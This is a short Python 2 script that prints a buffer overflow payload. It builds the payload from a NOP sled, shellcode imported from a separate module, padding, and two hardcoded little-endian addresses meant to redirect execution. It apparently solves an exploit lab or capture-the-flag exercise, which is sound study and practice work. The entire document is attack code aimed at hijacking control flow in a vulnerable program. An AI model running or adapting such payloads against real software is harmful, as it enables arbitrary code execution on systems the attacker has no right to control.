from struct import pack
from shellcode import shellcode

print '\x90'*15 + shellcode, '\x90'*40 + pack("<I", 0xbffe9589) + pack("<I", 0x08080f37), '2'*40
